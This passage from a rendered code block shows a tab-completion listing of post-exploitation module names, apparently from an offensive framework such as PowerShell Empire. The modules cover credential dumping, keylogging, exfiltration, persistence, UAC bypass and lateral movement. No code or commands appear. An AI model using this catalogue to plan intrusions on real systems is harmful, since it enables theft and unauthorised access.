</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">140
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">141
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">142
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">143
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">144
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">145
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">146
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">147
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">148
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">149
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">150
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">151
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">152
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">153
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">154
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">155
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">156
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">157
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">158
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">159
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">160
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">161
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">162
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">163
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">164
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">165
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">166
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">167
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">168
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">169
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">170
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">171
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">172
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">173
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">174
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">175
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">176
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">177
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">178
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">179
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">180
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">181
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">182
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">183
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">184
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">185
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">186
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">187
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">188
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">189
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">190
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">191
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">192
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">193
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">194
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">195
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">196
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">197
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">198
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">199
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">200
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">201
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">202
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">203
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">204
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">205
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>Display all <span style=color:#ae81ff>204</span> possibilities<span style=color:#960050;background-color:#1e0010>?</span> (y <span style=color:#f92672>or</span> n)
</span></span><span style=display:flex><span>code_execution<span style=color:#f92672>/</span>invoke_dllinjection
</span></span><span style=display:flex><span>code_execution<span style=color:#f92672>/</span>invoke_metasploitpayload
</span></span><span style=display:flex><span>code_execution<span style=color:#f92672>/</span>invoke_ntsd
</span></span><span style=display:flex><span>code_execution<span style=color:#f92672>/</span>invoke_reflectivepeinjection
</span></span><span style=display:flex><span>code_execution<span style=color:#f92672>/</span>invoke_shellcode
</span></span><span style=display:flex><span>code_execution<span style=color:#f92672>/</span>invoke_shellcodemsil
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>ChromeDump
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>FoxDump
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>USBKeylogger<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>WebcamRecorder
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>browser_data
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>clipboard_monitor
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>file_finder
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>find_interesting_file
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>get_indexed_item
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>get_sql_column_sample_data
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>get_sql_query
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>inveigh
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>keylogger
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>minidump
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>netripper
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>ninjacopy<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>packet_capture<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>prompt
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>screenshot
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>vaults<span style=color:#f92672>/</span>add_keepass_config_trigger
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>vaults<span style=color:#f92672>/</span>find_keepass_config
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>vaults<span style=color:#f92672>/</span>get_keepass_config_trigger
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>vaults<span style=color:#f92672>/</span>keethief
</span></span><span style=display:flex><span>collection<span style=color:#f92672>/</span>vaults<span style=color:#f92672>/</span>remove_keepass_config_trigger
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>credential_injection<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>enum_cred_store
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>invoke_kerberoast
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>cache<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>certs<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>command<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>dcsync
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>dcsync_hashdump
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>extract_tickets
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>golden_ticket
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>keys<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>logonpasswords<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>lsadump<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>mimitokens<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>pth<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>purge
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>sam<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>silver_ticket
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>mimikatz<span style=color:#f92672>/</span>trust_keys<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>powerdump<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>sessiongopher
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>tokens
</span></span><span style=display:flex><span>credentials<span style=color:#f92672>/</span>vault_credential<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>exfiltration<span style=color:#f92672>/</span>egresscheck
</span></span><span style=display:flex><span>exfiltration<span style=color:#f92672>/</span>exfil_dropbox
</span></span><span style=display:flex><span>exploitation<span style=color:#f92672>/</span>exploit_eternalblue
</span></span><span style=display:flex><span>exploitation<span style=color:#f92672>/</span>exploit_jboss
</span></span><span style=display:flex><span>exploitation<span style=color:#f92672>/</span>exploit_jenkins
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>inveigh_relay
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_dcom
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_executemsbuild
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_psexec
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_psremoting
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_smbexec
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_sqloscmd
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_sshcommand
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_wmi
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>invoke_wmi_debugger
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>jenkins_script_console
</span></span><span style=display:flex><span>lateral_movement<span style=color:#f92672>/</span>new_gpo_immediate_task
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>disable_rdp<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>downgrade_account
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>enable_multi_rdp<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>enable_rdp<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>get_domain_sid
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>honeyhash<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>invoke_script
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>lock
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>logoff
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>mailraider<span style=color:#f92672>/</span>disable_security
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>mailraider<span style=color:#f92672>/</span>get_emailitems
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>mailraider<span style=color:#f92672>/</span>get_subfolders
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>mailraider<span style=color:#f92672>/</span>mail_search
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>mailraider<span style=color:#f92672>/</span>search_gal
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>mailraider<span style=color:#f92672>/</span>send_mail
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>mailraider<span style=color:#f92672>/</span>view_email
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>psinject
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>reflective_inject
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>restart
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>runas
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>shinject
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>sid_to_user
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>spawn
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>spawnas
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>switch_listener
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>timestomp
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>user_to_sid
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>vnc
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>wdigest_downgrade<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>management<span style=color:#f92672>/</span>zipfolder
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>elevated<span style=color:#f92672>/</span>registry<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>elevated<span style=color:#f92672>/</span>schtasks<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>elevated<span style=color:#f92672>/</span>wmi<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>elevated<span style=color:#f92672>/</span>wmi_updater<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>add_netuser
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>add_sid_history<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>debugger<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>disable_machine_acct_change<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>get_ssps
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>install_ssp<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>memssp<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>misc<span style=color:#f92672>/</span>skeleton_key<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>powerbreach<span style=color:#f92672>/</span>deaduser
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>powerbreach<span style=color:#f92672>/</span>eventlog<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>powerbreach<span style=color:#f92672>/</span>resolver
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>userland<span style=color:#f92672>/</span>backdoor_lnk
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>userland<span style=color:#f92672>/</span>registry
</span></span><span style=display:flex><span>persistence<span style=color:#f92672>/</span>userland<span style=color:#f92672>/</span>schtasks
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>ask
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>bypassuac
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>bypassuac_env
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>bypassuac_eventvwr
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>bypassuac_fodhelper
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>bypassuac_sdctlbypass
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>bypassuac_tokenmanipulation
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>bypassuac_wscript
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>getsystem<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>gpp
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>mcafee_sitelist
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>ms16<span style=color:#f92672>-</span><span style=color:#ae81ff>032</span>
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>ms16<span style=color:#f92672>-</span><span style=color:#ae81ff>135</span>
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>allchecks
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>find_dllhijack
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>service_exe_restore
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>service_exe_stager
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>service_exe_useradd
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>service_stager
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>service_useradd
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>powerup<span style=color:#f92672>/</span>write_dllhijacker
</span></span><span style=display:flex><span>privesc<span style=color:#f92672>/</span>tater
</span></span><span style=display:flex><span>recon<span style=color:#f92672>/</span>find_fruit
</span></span><span style=display:flex><span>recon<span style=color:#f92672>/</span>get_sql_server_login_default_pw
</span></span><span style=display:flex><span>recon<span style=color:#f92672>/</span>http_login
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>antivirusproduct
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>computerdetails<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>dnsserver
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>findtrusteddocuments
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>get_pathacl
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>get_proxy
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>get_uaclevel
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>monitortcpconnections
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>paranoia<span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>host<span style=color:#f92672>/</span>winenum
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>arpscan
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>bloodhound
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>get_exploitable_system
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>get_spn
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>get_sql_instance_domain
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>get_sql_server_info
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>portscan
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>find_foreign_group
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>find_foreign_user
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>find_gpo_computer_admin
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>find_gpo_location
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>find_localadmin_access
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>find_managed_security_group
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_cached_rdpconnection
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_computer
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_dfs_share
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_domain_controller
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_domain_policy
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_domain_trust
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_fileserver
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_forest
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_forest_domain
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_gpo
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_group
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_group_member
</span></span><span style=display:flex><span>situational_awareness<span style=color:#f92672>/</span>network<span style=color:#f92672>/</span>powerview<span style=color:#f92672>/</span>get_localgroup
